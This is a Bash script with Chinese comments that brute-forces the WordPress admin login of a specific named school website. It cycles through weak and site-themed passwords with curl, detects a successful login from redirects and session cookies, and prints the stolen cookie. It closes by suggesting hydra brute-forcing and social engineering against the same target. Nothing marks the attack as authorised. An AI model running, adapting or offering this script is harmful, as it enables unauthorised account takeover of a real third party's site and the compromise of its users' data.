#!/bin/bash
TARGET="https://aay.ac.th"
USER="admin"
PASSWORDS=(
    "admin" "Admin123" "admin123" "password" "Password123" 
    "123456" "aay2024" "aay123" "ayothaya123" "school123"
    "Aay@2024" "Admin@123" "Welcome123" "P@ssw0rd"
)

echo "=== WordPress精确弱口令测试 ==="
echo "[+] 目标: $TARGET"
echo "[+] 用户: $USER"
echo "[+] 密码字典: ${#PASSWORDS[@]}个"
echo

for pass in "${PASSWORDS[@]}"; do
    echo -n "[*] 测试 $USER:$pass ... "
    
    # 1. 获取初始cookie
    curl -sk "$TARGET/wp-login.php" -c /tmp/wp_init.txt -o /dev/null 2>&1
    
    # 2. 提交登录，只获取响应头（不跟随重定向）
    RESPONSE=$(curl -sk "$TARGET/wp-login.php" \
        -X POST \
        -b /tmp/wp_init.txt \
        -c /tmp/wp_result.txt \
        -d "log=$USER&pwd=$pass&wp-submit=Log+In&testcookie=1" \
        -D /tmp/wp_headers.txt \
        -o /tmp/wp_body.html \
        -w "%{http_code}" \
        2>&1)
    
    # 3. 多重判断（4个条件）
    
    # 判断1: 检查HTTP状态码（302=可能成功）
    if [ "$RESPONSE" = "302" ]; then
        # 判断2: 检查Location头（重定向到wp-admin=成功）
        if grep -qi "Location:.*wp-admin" /tmp/wp_headers.txt; then
            # 判断3: 检查Cookie（有wordpress_logged_in=成功）
            if grep -qi "wordpress_logged_in" /tmp/wp_result.txt; then
                echo "✅ 成功！"
                echo
                echo "═══════════════════════════════════════"
                echo "✅ GetShell成功！"
                echo "═══════════════════════════════════════"
                echo "用户名: $USER"
                echo "密码: $pass"
                echo "登录URL: $TARGET/wp-login.php"
                echo "后台URL: $TARGET/wp-admin/"
                echo
                echo "Cookie已保存: /tmp/wp_result.txt"
                cat /tmp/wp_result.txt
                exit 0
            fi
        fi
    fi
    
    # 判断4: 检查错误提示（最准确）
    if grep -qi "login_error\|incorrect\|wrong" /tmp/wp_body.html; then
        echo "❌ 密码错误"
    else
        echo "❓ 未知响应 (HTTP $RESPONSE)"
        # 保存疑似成功的响应
        if [ "$RESPONSE" != "200" ] && [ "$RESPONSE" != "000" ]; then
            echo "   → 响应码异常，保存日志: wp_suspicious_$pass.html"
            cp /tmp/wp_body.html "wp_suspicious_$pass.html"
        fi
    fi
    
    sleep 2
done

echo
echo "❌ 所有密码测试失败"
echo "建议:"
echo "1. 使用hydra暴力破解: hydra -l admin -P wordlist.txt aay.ac.th https-post-form"
echo "2. 社工获取真实密码"
echo "3. 寻找其他突破点"
